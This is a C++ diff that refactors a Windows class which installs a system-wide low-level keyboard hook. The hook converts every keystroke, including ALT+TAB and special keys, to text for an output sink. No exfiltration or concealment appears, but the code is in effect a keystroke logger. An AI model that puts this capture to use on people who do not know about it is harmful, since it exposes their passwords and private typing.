@@ -6,12 +6,14 @@
 
 #include "event_sink.h"
 
+// Maps HHOOKs to the corresponding UserInputEventSource
+HHOOK UserInputEventSource::hKeyboardHook = NULL;
+// The instance that keyboard proc will treat as the owner.
+// this allows us to retrieve the associated instance when the hook is executed (and not use singletons)
+UserInputEventSource *currentInstance = nullptr;
+
 bool leftAltPressed = false;
 bool tabPressed = false;
-
-/** Static variable initialization */
-HHOOK UserInputEventSource::hKeyboardHook = NULL;
-EventSink *UserInputEventSource::outputSink = nullptr;
 
 void UserInputEventSource::initializeSource(EventSink *inSink)
 {
@@ -21,19 +23,26 @@ void UserInputEventSource::initializeSource(EventSink *inSink)
         throw std::runtime_error(RP_ERR_INITIALIZED_WITH_NULLPTR_EVENT_SINK);
     }
 
-    // We need to get a handle to the module (a loaded .dll or .exe) that contains
-    // the hook procedure code Since the hook proc code will exist in the same
-    // binary file, we set the module name to null here which returns a handle to
-    // the file used to create the calling process (calling process is our app)
+    if (hKeyboardHook != NULL || currentInstance != nullptr)
+    {
+        throw std::runtime_error(
+            std::string("Tried to initialize a UserInputEventSource, but one was already initialized earlier."
+                        "Only a single UserInputEventSource may exist at any given time. hKeyboardHook must "
+                        "be NULL, and currentInstance must be nullptr!") +
+            "\nWas hKeyboardHook null?: " + (hKeyboardHook == NULL ? "Yes" : "No") +
+            "\nWas currentInstance nullptr?: " + (currentInstance == nullptr ? "Yes" : "No"));
+    }
+    // Handle to the module (a loaded .dll or .exe) that contains
+    // the hook procedure code (NULL = this process)
     HMODULE hMod = GetModuleHandle(NULL);
 
     // Install the hook
     hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hMod, 0);
-
     if (!hKeyboardHook)
     {
         throw std::runtime_error("Failed to register keyboard hook: " + std::to_string(GetLastError()));
     }
+    currentInstance = this;
 
     spdlog::info("UserInputEventSource successfully installed keyboard hook");
 }
@@ -44,6 +53,7 @@ void UserInputEventSource::uninitializeSource()
 
     UnhookWindowsHookEx(hKeyboardHook);
     hKeyboardHook = NULL;
+    currentInstance = nullptr;
     spdlog::info("UserInputEventSource successfully uninstalled keyboard hook");
 }
 
@@ -80,6 +90,12 @@ bool handleSpecialkey(int vkCode, EventSink *outputSink)
 
 LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+
+    UserInputEventSource *instance = currentInstance;
+
+    assert(instance != nullptr, "UserInputEventSource::KeyboardProc ran, but currentInstance was nullptr. This should "
+                                "never happen, as the currentInstance should be set to null when the hook is removed.");
+
     if (nCode == HC_ACTION)
     {
         // lParam is a pointer to a KBDLLHOOKSTRUCT
@@ -100,7 +116,7 @@ LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LP
                 // false
                 if (!leftAltPressed)
                 {
-                    *outputSink << "[TAB]";
+                    *currentInstance->outputSink << "[TAB]";
                     tabPressed = false;
                 }
                 else
@@ -112,17 +128,17 @@ LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LP
             // Handle ALT+TAB
             if (leftAltPressed && tabPressed)
             {
-                *outputSink << "[ALT+TAB]";
+                *currentInstance->outputSink << "[ALT+TAB]";
             }
             // Handle special key or everything else
-            else if (!handleSpecialkey(pKeyboard->vkCode, outputSink))
+            else if (!handleSpecialkey(pKeyboard->vkCode, currentInstance->outputSink))
             {
                 // If we get here and alt is pressed, that means that left alt was/is
                 // pressed, and the key that followed it was not TAB, so we'll just
                 // treat it as another combination (this is scuffed)
                 if (leftAltPressed)
                 {
-                    *outputSink << "[ALT]";
+                    *currentInstance->outputSink << "[ALT]";
                 }
 
                 wchar_t unicodeBuffer[2] = {0};
@@ -162,7 +178,7 @@ LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LP
                     // If all of the chars were printable, then send them to output sink
                     if (i == len)
                     {
-                        *outputSink << unicodeBuffer;
+                        *currentInstance->outputSink << unicodeBuffer;
                     }
                 }
             }
